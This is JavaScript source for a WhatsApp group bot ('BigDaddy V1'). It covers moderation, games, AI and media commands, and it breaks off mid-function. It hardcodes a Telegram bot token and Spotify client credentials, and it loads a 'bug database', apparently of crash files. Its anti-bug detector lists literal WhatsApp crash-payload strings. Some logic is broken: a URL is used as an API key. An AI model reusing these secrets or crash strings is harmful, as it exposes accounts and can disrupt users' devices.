//base by @phistar
const { default: makeWASocket, fetchLatestBaileysVersion, downloadContentFromMessage, useMultiFileAuthState, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys')
const os = require('os')
const fs = require('fs') 
const fsx = require('fs-extra')
const path = require('path')
const util = require('util')
const FormData = require('form-data');
const chalk = require('chalk')
const moment = require('moment-timezone')
const speed = require('performance-now')
const ms = toMs = require('ms')
const axios = require('axios')
const fetch = require('node-fetch')
const pino = require('pino')
const readline = require("readline");
const { exec, spawn, execSync } = require("child_process")
const { performance } = require('perf_hooks')
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const { TelegraPh, UploadFileUgu, webp2mp4File, floNime } = require('./lib/uploader')
const { toAudio, toPTT, toVideo, ffmpeg, addExifAvatar } = require('./lib/converter')
const { smsg, getGroupAdmins, formatp, jam, formatDate, getTime, isUrl, await, sleep, clockString, msToDate, sort, toNumber, enumGetKey, runtime, fetchJson, getBuffer, json, delay, format, logic, generateProfilePicture, parseMention, getRandom, pickRandom, reSize } = require('./lib/myfunc')
let afk = require("./lib/afk");
const { addPremiumUser, getPremiumExpired, getPremiumPosition, expiredCheck, checkPremiumUser, getAllPremiumUser } = require('./lib/premiun')
const { fetchBuffer, buffergif } = require("./lib/myfunc2")
const tempMailData = {};
const NodeCache = require('node-cache');
const settings = require('./phistarbot.js'); // Import settings
//bug database 
var wkwk = fs.readFileSync(`./16/p.mp3`)
var xsteek = fs.readFileSync(`./16/p.webp`)
var o = fs.readFileSync(`./16/p.jpg`)
//database
var antilinkall = fs.readFileSync("database/antilinkall.json", "utf8");
var _owner = JSON.parse(fs.readFileSync('./database/owner.json'))
var owner = fs.readFileSync("database/owner.json", "utf8");
var premium = fs.readFileSync("database/premium.json", "utf8");
console.log(premium); 

var _afk = JSON.parse(fs.readFileSync('./database/afk-user.json', 'utf8'));
var hit = JSON.parse(fs.readFileSync('./database/total-hit-user.json'));

// Autoreply
var VoiceNoteXeon = JSON.parse(fs.readFileSync('./database/autoreply/vn.json'));
var StickerXeon = JSON.parse(fs.readFileSync('./database/autoreply/sticker.json'));
var ImageXeon = JSON.parse(fs.readFileSync('./database/autoreply/image.json'));
var VideoXeon = JSON.parse(fs.readFileSync('./database/autoreply/video.json'));
var DocXeon = JSON.parse(fs.readFileSync('./database/autoreply/doc.json'));
var ZipXeon = JSON.parse(fs.readFileSync('./database/autoreply/zip.json'));
var ApkXeon = JSON.parse(fs.readFileSync('./database/autoreply/apk.json'));

// Time variables
var xtime = moment.tz('Asia/Kolkata').format('HH:mm:ss');
var xdate = moment.tz('Asia/Kolkata').format('DD/MM/YYYY');
var time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss');

// Adjusting variable type for reassignment
let xeonytimewisher;
if (time2 < "23:59:00") {
    xeonytimewisher = `Hey am BigDaddy\nV1 created by ᴘʜ✦ꜱᴛᴀʀ.`;
} else if (time2 < "19:00:00") {
    xeonytimewisher = `Hey am BigDaddy\nV1 created by ᴘʜ✦ꜱᴛᴀʀ.`;
} else if (time2 < "18:00:00") {
    xeonytimewisher = `Hey am BigDaddy\nV1 created by ᴘʜ✦ꜱᴛᴀʀ.`;
} else if (time2 < "15:00:00") {
    xeonytimewisher = `Hey am BigDaddy\nV1 created by ᴘʜ✦ꜱᴛᴀʀ.`;
} else if (time2 < "11:00:00") {
    xeonytimewisher = `Hey am BigDaddy\nV1 created by ᴘʜ✦ꜱᴛᴀʀ.`;
} else if (time2 < "05:00:00") {
    xeonytimewisher = `Hey am BigDaddy\nV1 created by ᴘʜ✦ꜱᴛᴀʀ.`;
}

// Main Module Export
module.exports = XeonBotInc = async (XeonBotInc, m, msg, chatUpdate, store) => {
    try {
        const {
            type,
            quotedMsg,
            mentioned,
            now,
            fromMe
        } = m;

        var body = (m.mtype === 'conversation') ? m.message.conversation :
            (m.mtype == 'imageMessage') ? m.message.imageMessage.caption :
            (m.mtype == 'videoMessage') ? m.message.videoMessage.caption :
            (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text :
            (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId :
            (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectreplygcxeon.selectedRowId :
            (m.mtype == 'templateButtonreplygcxeonMessage') ? m.message.templateButtonreplygcxeonMessage.selectedId :
            (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectreplygcxeon.selectedRowId || m.text) : '';
            
        var prefa = "!"; // Default prefix for commands
        var budy = (typeof m.text == 'string' ? m.text : '');
        var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(budy) ? budy.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix;
        
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase();
        const args = body.trim().split(/ +/).slice(1);
        const full_args = body.replace(command, '').slice(1).trim();
        const pushname = m.pushName || "No Name";
        const ytdl = require('ytdl-core');
        const botNumber = await XeonBotInc.decodeJid(XeonBotInc.user.id);
        const itsMe = m.sender == botNumber ? true : false;
        const sender = m.sender;
        const text = q = args.join(" ");
        const from = m.key.remoteJid;
        const fatkuns = (m.quoted || m);
        const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] :
            (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] :
            (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m;
        const mime = (quoted.msg || quoted).mimetype || '';
        const qmsg = (quoted.msg || quoted);
        const isMedia = /image|video|sticker|audio/.test(mime);
        const isImage = (type == 'imageMessage');
        const isVideo = (type == 'videoMessage');
        const isAudio = (type == 'audioMessage');
        const isText = (type == 'textMessage');
        const isSticker = (type == 'stickerMessage');
        const isQuotedText = type === 'extendexTextMessage' && content.includes('textMessage')
        const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
        const sticker = []
        const isAfkOn = afk.checkAfkUser(m.sender, _afk)
        const isGroup = m.key.remoteJid.endsWith('@g.us')
        const groupMetadata = m.isGroup ? await XeonBotInc.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
        const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
        const isCreator = [ownernumber, ..._owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const isPremium = isCreator || isCreator || checkPremiumUser(m.sender, premium);
        const clientId = XeonBotInc.user.id.split(':')[0];
        const senderbot = m.key.fromMe ? XeonBotInc.user.id.split(':')[0] + "@s.whatsapp.net" || XeonBotInc.user.id : m.key.participant || m.key.remoteJid;
        const senderId = senderbot.split('@')[0];
        const isBot = clientId.includes(senderId);
        expiredCheck(XeonBotInc, m, premium);
        // Read the current Anti-Link group list
const antilinkGroups = JSON.parse(fs.readFileSync('./database/antilinkall.json', 'utf-8') || '[]');
let chatbot = false; // Default state of the chatbot

if (m.isGroup && antilinkGroups.includes(m.chat)) {
    const linkRegex = /https?:\/\/[^\s]+/; // Regex to detect links
    if (linkRegex.test(m.text)) {
        // Delete the message
        await XeonBotInc.sendMessage(m.chat, { delete: m.key });

        // Warn the sender
        replygcxeon(`⚠️ Links are not allowed in this group, @${m.sender.split('@')[0]}!`);

        // Optional: Remove the sender (uncomment to enable)
        // await XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
    }
}
// Use your bot's message handling logic to respond to user questions.       
//group chat msg by xeon
const replygcxeon = (teks) => {
XeonBotInc.sendMessage(m.chat,
{ text: teks,
contextInfo:{
mentionedJid:[sender],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./Phistar-media/phistar.jpg`),
"sourceUrl": `${link}`}}},
{ quoted: m})
}
global.userSessions = {};  // Initialize user sessions globally
async function Telesticker(url) {
    return new Promise(async (resolve, reject) => {
        if (!url.match(/(https:\/\/t.me\/addstickers\/)/gi)) return replygcxeon('Enther your url telegram sticker link')
        packName = url.replace("https://t.me/addstickers/", "")
        data = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getStickerSet?name=${encodeURIComponent(packName)}`, {method: "GET",headers: {"User-Agent": "GoogleBot"}})
        const xeonyresult = []
        for (let i = 0; i < data.data.result.stickers.length; i++) {
            fileId = data.data.result.stickers[i].thumb.file_id
            data2 = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getFile?file_id=${fileId}`)
            result = {
            status: 200,
            author: 'Phistar',
            url: "https://api.telegram.org/file/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/" + data2.data.result.file_path
            }
            xeonyresult.push(result)
        }
    resolve(xeonyresult)
    })
}
process.setMaxListeners(50); // Increase the listener limit

// Your OpenAI API key
const API_KEY = `https://api.abrotech.com.ng/api/chatgpt3?prompt=${text}?&apikey=abrotech`

// Function to handle text-based commands (Smart Daddy)
async function handleSmartDaddy(question) {
  try {
    const response = await axios.post('https://api.openai.com/v1/completions', {
      model: 'gpt-4', // Specify the model
      prompt: question,
      max_tokens: 100,
      temperature: 0.7,
    }, {
      headers: {
        'Authorization': `Bearer ${API_KEY}`,
        'Content-Type': 'application/json',
      },
    });

    // Return the text-based response from GPT
    return response.data.choices[0].text.trim();
  } catch (error) {
    console.error('Error in Smart Daddy:', error);
    throw new Error('Smart Daddy request failed.');
  }
}

// Function to handle image generation commands (Generate)
async function handleGenerate(prompt) {
  try {
    const response = await axios.post('https://api.openai.com/v1/images/generations', {
      prompt: prompt, // The image description input
      n: 1,           // Number of images to generate
      size: "1024x1024",
    }, {
      headers: {
        'Authorization': `Bearer ${API_KEY}`,
        'Content-Type': 'application/json',
      },
    });

    // Return the image URL
    return response.data.data[0].url;
  } catch (error) {
    console.error('Error in Generate:', error);
    throw new Error('Image generation request failed.');
  }
}

// Global object to track user cooldowns
const userCooldowns = {};

// Main function to handle user messages with cooldown logic
async function handleUserMessage(userId, input) {
  const currentTime = Date.now();
  const cooldownTime = 2 * 60 * 1000; // 2 minutes in milliseconds

  try {
    // Check if the user is in cooldown
    if (userCooldowns[userId] && (currentTime - userCooldowns[userId] < cooldownTime)) {
      return 'Please wait 2 minutes before using this command again to avoid exceeding limits.';
    }

    // Reset cooldown for this user
    userCooldowns[userId] = currentTime;

    // Handle the user's input and respond accordingly
    if (input.startsWith('Smart Daddy')) {
      const question = input.replace('Smart Daddy', '').trim();
      const answer = await handleSmartDaddy(question);
      return answer + '\n\n⚠️ Please pause for 2 minutes before using this command again.';
    } else if (input.startsWith('Generate')) {
      const description = input.replace('Generate', '').trim();
      const imageURL = await handleGenerate(description);
      return imageURL + '\n\n⚠️ Please pause for 2 minutes before using this command again.';
    } else {
      return 'Invalid command. Use "Smart Daddy" for questions or "Generate" for images.';
    }
  } catch (err) {
    // Log the error and return a default message without affecting the bot flow
    console.error('Error handling user message:', err);
    return 'An error occurred while processing your request.';
  }
}
const devinettes = [
  {
    question: "I can fly without wings, who am I?",
    reponse: "The weather",
  },
  {
    question: "I'm always hungry, the more I eat, the fatter I become. Who am I?",
    reponse: "A black hole",
  },
  {
    question: "What has keys but can't open locks?",
    reponse: "A piano",
  },
  {
    question: "The more you take, the more you leave behind. What am I?",
    reponse: "Footsteps",
  },
  {
    question: "What comes once in a minute, twice in a moment, but never in a thousand years?",
    reponse: "The letter 'M'",
  },
  {
    question: "What has a head, a tail, is brown, and has no legs?",
    reponse: "A penny",
  },
  {
    question: "What has hands but can’t clap?",
    reponse: "A clock",
  },
  {
    question: "What can travel around the world while staying in the same corner?",
    reponse: "A stamp",
  },
  {
    question: "I speak without a mouth and hear without ears. I have no body, but I come alive with wind. What am I?",
    reponse: "An echo",
  },
  {
    question: "I shave every day, but my beard stays the same. What am I?",
    reponse: "A barber",
  },
  {
    question: "You see me once in June, twice in November, and not at all in May. What am I?",
    reponse: "The letter 'E'",
  },
  {
    question: "What can you break, even if you never pick it up or touch it?",
    reponse: "A promise",
  },
  {
    question: "I have branches, but no fruit, trunk, or leaves. What am I?",
    reponse: "A bank",
  },
  {
    question: "What has to be broken before you can use it?",
    reponse: "An egg",
  },
  {
    question: "What has an eye but cannot see?",
    reponse: "A needle",
  },
  {
    question: "The more of this you take, the more you leave behind. What is it?",
    reponse: "Footsteps",
  },
  {
    question: "What is full of holes but still holds water?",
    reponse: "A sponge",
  },
  {
    question: "What gets wet while drying?",
    reponse: "A towel",
  },
  {
    question: "I’m light as a feather, yet the strongest person can’t hold me for five minutes. What am I?",
    reponse: "Your breath",
  },
  {
    question: "What invention lets you look right through a wall?",
    reponse: "A window",
  },
  {
    question: "What goes up but never comes down?",
    reponse: "Your age",
  },
  {
    question: "What has many keys but can’t open a single lock?",
    reponse: "A piano",
  },
  {
    question: "Where does today come before yesterday?",
    reponse: "In a dictionary",
  },
  {
    question: "What has one eye, but can’t see?",
    reponse: "A needle",
  },
  {
    question: "What is so fragile that saying its name breaks it?",
    reponse: "Silence",
  },
  {
    question: "What can run but never walks, has a bed but never sleeps, has a mouth but never talks?",
    reponse: "A river",
  },
  {
    question: "What can fill a room but takes up no space?",
    reponse: "Light",
  },
  {
    question: "If you drop me, I’m sure to crack, but give me a smile, and I’ll always smile back. What am I?",
    reponse: "A mirror",
  }
];
async function loading(from) {
    const xeonlod = [
        "🌟 *BIG DADDY V1*  10%... 🌟",
        "⚡️ *INITIATING...* 30% ⚡️",
        "🔋 *POWERED BY PHISTAR* 50% 🔋",
        "🚀 *80% ALMOST DONE... 80%* 🚀",
        "💥 *BIG DADDY V1* 100% 💥",
        "💎 *BIG DADDY V1* *LOADING COMPLETED* 💎"
    ];

    let { key } = await XeonBotInc.sendMessage(from, { text: '⏳ *LOADING...* ⏳' });

    // Add a small delay between the messages to make it look more dynamic
    for (let i = 0; i < xeonlod.length; i++) {
        await XeonBotInc.sendMessage(from, { text: xeonlod[i], edit: key });
        await new Promise(resolve => setTimeout(resolve, 1500));  // 1.5 second delay between updates
    }

    // Final message with a cool effect
    await XeonBotInc.sendMessage(from, { text: "*BigDaddyV1* 𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳 💥🔥" });
}
async function downloadFile(url, localPath) {
    try {
        const response = await axios.get(url, { responseType: 'text' }); // Ensure response is plain text
        fs.writeFileSync(localPath, response.data, 'utf8'); // Write the data as a UTF-8 string
        console.log(`File downloaded and saved a BigDaddy 1.js`);
    } catch (error) {
        console.error('Error downloading file:', error);
        throw error;
    }
}
const BASE_URL = "https://onlinesim.io/api/v1/free_numbers_content/";

async function getOnlineCountries() {
    try {
        const response = await axios.get(`${BASE_URL}countries?lang=en`);
        if (response.data.response === "1") {
            const allCountries = response.data.counties;
            const onlineCountries = allCountries.filter(country => country.online);
            return onlineCountries.map(country => ({
                name: country.country,
                code: country.country_code
            }));
        } else {
            throw new Error("Failed to fetch online countries.");
        }
    } catch (error) {
        console.error("Error fetching countries:", error.message);
        return [];
    }
}


async function getCountryNumbers(country) {
    try {
        const response = await axios.get(`${BASE_URL}countries/${country}?lang=en`);
        if (response.data.response === "1") {
            const numbers = response.data.numbers.map(num => ({
                description: num.data_humans,
                fullNumber: num.full_number
            }));
            return numbers;
        } else {
            throw new Error("Failed to fetch numbers.");
        }
    } catch (error) {
        console.error("Error fetching numbers:", error.message);
        return [];
    }
}


async function getNumberInbox(country, number) {
    try {
        const response = await axios.get(`${BASE_URL}countries/${country}/${number}?lang=en`);
        if (response.data.response === "1" && response.data.online) {
            const messages = response.data.messages.data.map(msg => ({
                sender: msg.data_humans,
                text: msg.text
            }));
            return messages;
        } else {
            throw new Error("Failed to fetch inbox messages.");
        }
    } catch (error) {
        console.error("Error fetching inbox:", error.message);
        return [];
    }
}

function getCountryFlag(countryCode) {
    const codePoints = countryCode
        .toUpperCase()
        .split('')
        .map(char => 127397 + char.charCodeAt());
    return String.fromCodePoint(...codePoints);
}
const antilinkPath = './antilink.json'; // Unique path variable for antilink settings

function loadSettings() {
    if (!fs.existsSync(antilinkPath)) {
        const defaultData = { groups: {} };
        fs.writeFileSync(antilinkPath, JSON.stringify(defaultData, null, 2), 'utf-8');
        console.log('Created antilink.json as it did not exist.');
        return defaultData;
    }
    return JSON.parse(fs.readFileSync(antilinkPath, 'utf-8'));
}

function saveSettings(data) {
    fs.writeFileSync(antilinkPath, JSON.stringify(data, null, 2), 'utf-8');
}

function updateGroupSettings(groupJid, settings) {
    const data = loadSettings();
    data.groups[groupJid] = settings;
    saveSettings(data);
}

function getGroupSettings(groupJid) {
    const data = loadSettings();
    return data.groups[groupJid] || { antilinkkick: false, antilinkwarn: false, antilinkdelete: false };
}

const urlRegex = /(https?:\/\/[^\s]+|[^\s]+\.(com|net|org|info|io|gov|edu|co|me|ng|xyz))/i;

if (urlRegex.test(budy)) { // Matches any URL or domain
    const settings = getGroupSettings(m.chat);

    // Check if any of the antilink options are enabled
    if (settings.antilinkkick || settings.antilinkwarn || settings.antilinkdelete) {
        if (!isBotAdmins) return; // Skip if the bot isn't an admin
        if (isAdmins || isCreator) return; // Skip for admins or the creator

        // Always delete the message regardless of the selected antilink type
        try {
            await XeonBotInc.sendMessage(m.chat, {
                delete: {
                    remoteJid: m.chat,
                    fromMe: false,
                    id: m.key.id,
                    participant: m.key.participant
                }
            });
            console.log("Deleted a message containing a link.");
        } catch (err) {
            console.log("Failed to delete the message:", err);
        }

        // Perform additional actions based on the settings
        if (settings.antilinkkick) {
            try {
                await XeonBotInc.sendMessage(m.chat, {
                    text: `Posting links is not allowed in this group, @${m.sender.split("@")[0]}. You are being removed.`,
                    mentions: [m.sender]
                });
                await XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
                console.log("Kicked participant:", m.sender);
            } catch (err) {
                console.log("Failed to kick participant:", err);
            }
        } else if (settings.antilinkwarn) {
            try {
                await XeonBotInc.sendMessage(m.chat, {
                    text: `Warning @${m.sender.split("@")[0]}! Posting links is not allowed in this group.`,
                    mentions: [m.sender]
                });
                console.log("Warned participant:", m.sender);
            } catch (err) {
                console.log("Failed to send warning:", err);
            }
        } else if (settings.antilinkdelete) {
            console.log("Deleted message without further action.");
        }
    }
}
// Initialize warning database
const antispamPath = './antispam.json';
const spamTracker = {}; // Temporary in-memory tracker for spam

// Load or initialize antispam settings
function loadSpamSettings() {
    if (!fs.existsSync(antispamPath)) {
        const defaultData = { groups: {} };
        fs.writeFileSync(antispamPath, JSON.stringify(defaultData, null, 2), 'utf-8');
        console.log('Created antispam.json as it did not exist.');
        return defaultData;
    }
    return JSON.parse(fs.readFileSync(antispamPath, 'utf-8'));
}

// Save settings to the JSON file
function saveSpamSettings(data) {
    fs.writeFileSync(antispamPath, JSON.stringify(data, null, 2), 'utf-8');
}

// Update settings for a specific group
function updateSpamSettings(groupJid, settings) {
    const data = loadSpamSettings();
    data.groups[groupJid] = settings;
    saveSpamSettings(data);
}

// Retrieve settings for a specific group
function getSpamSettings(groupJid) {
    const data = loadSpamSettings();
    return data.groups[groupJid] || { enabled: false, spamLimit: 5 };
}
async function searchSpotifyTracks(query) {
  const clientId = 'acc6302297e040aeb6e4ac1fbdfd62c3';
  const clientSecret = '0e8439a1280a43aba9a5bc0a16f3f009';
  const auth = Buffer.from(`${clientId}:${clientSecret}`).toString('base64');

  const getToken = async () => {
    const response = await fetch('https://accounts.spotify.com/api/token', {
      method: 'POST',
      timeout: 60000, // 60 seconds
      body: new URLSearchParams({ grant_type: 'client_credentials' }),
      headers: { Authorization: `Basic ${auth}` },
    });
    return (await response.json()).access_token;
  };

  const accessToken = await getToken();
  const offset = 10;
  const searchUrl = `https://api.spotify.com/v1/search?q=${encodeURIComponent(query)}&type=track&offset=${offset}`;
  const response = await fetch(searchUrl, {
    headers: { Authorization: `Bearer ${accessToken}` },
  });
  const data = await response.json();
  return data.tracks.items;
}

function pickRandom(list) {
return list[Math.floor(list.length * Math.random())]
}
const folderPath = './Phistar-media';  // Folder where the file is located
const fileName = 'uploads.txt'; // Name of the file to upload
const filePath = `${folderPath}/${fileName}`; // Full file path

if (!fs.existsSync(filePath)) {
    console.error(`❌ File not found: ${filePath}`);
} else {
    (async () => {
        try {
            const result = await catbox(filePath);
            console.log(`✅ Uploaded file URL: ${result.url}`);
        } catch (error) {
            console.error(`❌ Error uploading file: ${error.message}`);
        }
    })();
}
// File auto-creation logic for catbox.js
const catboxFilePath = './catbox.js';
if (!fs.existsSync(catboxFilePath)) {
    console.log('📂 File "catbox.js" not found. Creating...');
    const catboxContent = `
const axios = require('axios');
const FormData = require('form-data');
const fs = require('fs');

async function catbox(path) {
    const data = new FormData();
    data.append('reqtype', 'fileupload');
    data.append('userhash', ''); // Optional, can be left blank
    data.append('fileToUpload', fs.createReadStream(path)); // Attach the file

    const config = {
        method: 'POST',
        url: 'https://catbox.moe/user/api.php',
        headers: {
            ...data.getHeaders(), // Correctly retrieve headers from FormData
        },
        data: data, // FormData instance
    };

    try {
        const api = await axios.request(config);
        return { url: api.data.trim() }; // Return the uploaded file URL
    } catch (error) {
        console.error('Error uploading to Catbox:', error.message);
        throw new Error('Failed to upload to Catbox');
    }
}

module.exports = { catbox };
`;
    fs.writeFileSync(catboxFilePath, catboxContent.trim());
    console.log('✅ File "catbox.js" created successfully.');
}

// Import the Catbox uploader
const { catbox } = require('./catbox');
        if (!XeonBotInc.public) {
            if (!isCreator && !m.key.fromMe) return
        }
        
        if (autoread) {
            XeonBotInc.readMessages([m.key])
        }
        
        if (global.autoTyping) {
        XeonBotInc.sendPresenceUpdate('composing', from)
        }

        if (global.autoRecording) {
        XeonBotInc.sendPresenceUpdate('recording', from)
        }
        // Antilink Protection
if (global.antilink || global.antilinkkick || global.antilinkwarn) {
    if (/https?:\/\/[^\s]+/i.test(budy)) { // Matches any URL
        if (!isBotAdmins) return; // Ensure bot is admin
        if (isAdmins || isCreator) return; // Skip for admins/owner

        // Delete the message
        try {
            await XeonBotInc.sendMessage(m.chat, {
                delete: {
                    remoteJid: m.chat,
                    fromMe: false,
                    id: m.key.id,
                    participant: m.key.participant
                }
            });
        } catch (err) {
            console.log('Failed to delete message:', err);
        }

        if (global.antilinkkick) {
            // Warn and kick the sender
            try {
                await XeonBotInc.sendMessage(m.chat, {
                    text: `Warning @${m.sender.split("@")[0]}, posting links is not allowed in this group!`,
                    mentions: [m.sender]
                });
                await XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
            } catch (err) {
                console.log('Failed to kick participant:', err);
            }
        } else if (global.antilinkwarn) {
            // Just warn the sender
            try {
                await XeonBotInc.sendMessage(m.chat, {
                    text: `Warning @${m.sender.split("@")[0]}! Do not send links in this group!`,
                    mentions: [m.sender]
                });
            } catch (err) {
                console.log('Failed to send warning:', err);
            }
        }
    }
}
const vm = require('vm');

// Function to interpret the obfuscated file and return the processed result
async function processObfuscatedFile(filePath) {
    try {
        // Check if the file exists
        if (!fs.existsSync(filePath)) {
            throw new Error('File not found.');
        }

        // Read the obfuscated file
        const obfuscatedCode = fs.readFileSync(filePath, 'utf8');

        // Set up a sandbox to capture console output
        let output = '';
        const sandbox = {
            console: {
                log: (data) => (output += data + '\n'), // Capture console.log outputs
                error: (data) => (output += 'Error: ' + data + '\n'),
            },
        };

        // Create a VM context with the sandbox
        const context = vm.createContext(sandbox);

        // Run the obfuscated code inside the sandbox
        vm.runInContext(obfuscatedCode, context);

        // Return the captured output
        return output.trim() || 'No output captured from the file.';
    } catch (error) {
        // Handle errors during execution
        console.error('Error while processing obfuscated file:', error);
        return `Error occurred while processing the file:\n\n${error.message}`;
    }
}
        //bot number online status, available=online, unavailable=offline
        XeonBotInc.sendPresenceUpdate('uavailable', from)
        
        if (global.autorecordtype) {
        let xeonrecordin = ['recording','composing']
        let xeonrecordinfinal = xeonrecordin[Math.floor(Math.random() * xeonrecordin.length)]
        XeonBotInc.sendPresenceUpdate(xeonrecordinfinal, from)

        }
        
        if (autobio) {
            XeonBotInc.updateProfileStatus(`24/7 Online Bot By ${ownername}`).catch(_ => _)
        }
        if (m.sender.startsWith('92') && global.anti92 === true) {
            return XeonBotInc.updateBlockStatus(m.sender, 'block')
        }
        let list = []
        for (let i of owner) {
list.push({
	    	displayName: await XeonBotInc.getName(i),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await XeonBotInc.getName(i)}\nFN:${await XeonBotInc.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}
	
	//chat counter (console log)
        if (m.message && m.isGroup) {
            console.log(chalk.cyan(`\n< ================================================== >\n`))
			console.log(chalk.green(`Group Chat:`))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(groupName, m.chat))
        } else {
            console.log(chalk.cyan(`\n< ================================================== >\n`))
			console.log(chalk.green(`Private Chat:`))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender))
        }
        let antibug = false; // Default state: OFF

const antibugMessage = `
🚫 𝐘𝐨𝐮 𝐡𝐚𝐯𝐞 𝐛𝐞𝐞𝐧 𝐟𝐥𝐚𝐠𝐠𝐞𝐝 𝐟𝐨𝐫 𝐬𝐞𝐧𝐝𝐢𝐧𝐠 𝐛𝐮𝐠𝐬 ⚠️  
☠️ 𝐀𝐧𝐭𝐢-𝐁𝐮𝐠 𝐒𝐲𝐬𝐭𝐞𝐦 𝐀𝐜𝐭𝐢𝐯𝐚𝐭𝐞𝐝 ⚡  
⚠️◼️◾◽ 𝐘𝐨𝐮 𝐚𝐫𝐞 𝐏𝐄𝐑𝐌𝐀𝐍𝐄𝐍𝐓𝐋𝐘 𝐁𝐋𝐎𝐂𝐊𝐄𝐃 ◽◾◼️⚠️  
🚫 **𝐀𝐥𝐥 𝐛𝐮𝐠 𝐚𝐭𝐭𝐞𝐦𝐩𝐭𝐬 𝐰𝐢𝐥𝐥 𝐟𝐚𝐢𝐥!** 🚫
`;

XeonBotInc.ev.on("messages.upsert", async (m) => {
  try {
    if (!antibug) return; // Exit if Anti-Bug is OFF

    const msg = m.messages[0];
    const sender = msg.key.remoteJid;

    // Skip if message is invalid or sent by the bot
    if (!msg.message || msg.key.fromMe) return;

    const messageContent = JSON.stringify(msg.message);
    const senderID = msg.key.participant || sender;

    // Payload Detection Logic (including the new sequence check)
    if (
      messageContent.length > 5000 || // Long payloads
      /(\u200B|\u200C|\u200D|\u202C|\u202E)/.test(messageContent) || // Invisible Unicode
      /crash|freeze|payload|malicious/i.test(messageContent) || // Bug keywords
      messageContent.includes("⚽ཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀི") || // Special Sequence 1
      messageContent.includes("ٯٯ𠀋ܱܰٯٯٯٯܱܰ𠀋ܱܰ") || // Special Sequence 2
      messageContent.includes("@529999997*.🔥؄ٽ؄🔥.*@234237*.🔥؄ٽ؄🔥.*@561623423*.~~.*@4124227*.🔥؄ٽ؄🔥.*@777777*.🔥؄ٽ؄🔥.*@529995531316*.~~.*@45*.🤴؄ٽ؄🤴.*@8401*.🤴؄ٽ؄🤴.*@5616*.~~.*@45*.🤴؄ٽ؄🤴.*@8401*.🤴؄ٽ؄🤴.*@5616*.~~.*@45*.🤴؄ٽ؄🤴.*@529995531316*.🤴") || // Special Sequence 3
      messageContent.includes("‫‪‫҈꙲ ‫‪‫҈꙲ ‫‪‫҈꙲ ‫‪‫҈꙲ ‫‪‫҈꙲") || // Special Sequence 4
